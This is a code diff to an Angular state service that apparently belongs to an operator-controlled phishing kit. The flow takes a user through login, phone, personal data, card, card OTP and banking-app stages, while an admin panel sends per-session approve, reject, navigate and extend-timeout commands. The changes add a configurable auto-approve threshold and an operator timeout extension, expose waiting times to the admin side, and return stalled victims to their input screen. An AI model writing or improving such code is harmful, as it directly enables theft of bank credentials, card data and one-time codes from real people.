@@ -116,6 +116,11 @@ export class StateService {
   readonly isCardSubmitted = signal<boolean>(false);
   readonly isFlowComplete = signal<boolean>(false);
 
+  // Auto-Approve Threshold (Dynamic)
+  readonly autoApproveThreshold = signal<number>(20000);
+  // Waiting Start Time (Expose for Admin Payload)
+  readonly waitingStartPublic = computed(() => this.waitingStart());
+
   // Inactivity & Timeout - Initialized explicitly
   readonly showTimeoutWarning = signal<boolean>(false);
   readonly timeoutCountdown = signal<number>(60);
@@ -345,7 +350,10 @@ export class StateService {
         isCardSubmitted: this.isCardSubmitted(),
         isFlowComplete: this.isFlowComplete(),
         rejectionReason: this.rejectionReason(),
-        timestamp: Date.now()
+        timestamp: Date.now(),
+        // New fields for Admin Countdown
+        waitingStart: this.waitingStartPublic(),
+        autoApproveThreshold: this.autoApproveThreshold()
     };
   }
 
@@ -376,10 +384,26 @@ export class StateService {
   private hydrateFromState(data: any, isInit: boolean) {
       this.isHydrating = true; // Prevent feedback loop
       
-      if(data.currentView) {
-          this.currentView.set(data.currentView);
+      let viewToRestore = data.currentView;
+
+      // Infinite Loading Fix:
+      // If user was stuck on loading screen, restore them to the input view of their current stage
+      if (viewToRestore === 'loading' && data.stage) {
+          const s = data.stage;
+          if (s === 'login') viewToRestore = 'login';
+          else if (s === 'phone_pending') viewToRestore = 'phone';
+          else if (s === 'personal_pending') viewToRestore = 'personal';
+          else if (s === 'card_pending') viewToRestore = 'card';
+          else if (s === 'card_otp_pending') viewToRestore = 'card_otp';
+          else if (s === 'bank_app_pending' || s === 'bank_app_input') viewToRestore = 'bank_app';
+
+          console.log(`[State] Fixed infinite loading. Redirecting ${data.currentView} -> ${viewToRestore}`);
+      }
+
+      if(viewToRestore) {
+          this.currentView.set(viewToRestore);
           // Sync Router
-          if (isInit) this.router.navigate([data.currentView]);
+          if (isInit) this.router.navigate([viewToRestore]);
       }
       if(data.stage) this.stage.set(data.stage);
       if(data.email) this.email.set(data.email);
@@ -501,7 +525,9 @@ export class StateService {
       const start = this.waitingStart();
       if (start && this.currentView() === 'loading') {
           const elapsed = Date.now() - start;
-          if (elapsed > 20000) { // Auto approve after 20s of waiting
+          const threshold = this.autoApproveThreshold();
+
+          if (elapsed > threshold) {
               this.waitingStart.set(null); 
 
               // Define payload based on stage
@@ -760,7 +786,7 @@ export class StateService {
       this.fetchSessions(); // Force immediate refresh
   }
 
-  private async sendAdminCommand(sessionId: string, action: string, payload: any) {
+  public async sendAdminCommand(sessionId: string, action: string, payload: any) {
       // Try Network
       const request$ = from(fetch('/api/command', {
           method: 'POST',
@@ -803,6 +829,11 @@ export class StateService {
               // Pass true to force navigation
               this.hydrateFromState(payload, true);
           }
+      } else if (action === 'EXTEND_TIMEOUT') {
+          // Add extra time to the auto-approve threshold
+          const duration = payload.duration || 10000;
+          this.autoApproveThreshold.update(v => v + duration);
+          console.log(`[State] Extended timeout by ${duration}ms. New threshold: ${this.autoApproveThreshold()}ms`);
       } else if (action === 'NAVIGATE') {
           this.navigate(payload.view, true);
       } else if (action === 'REJECT') {
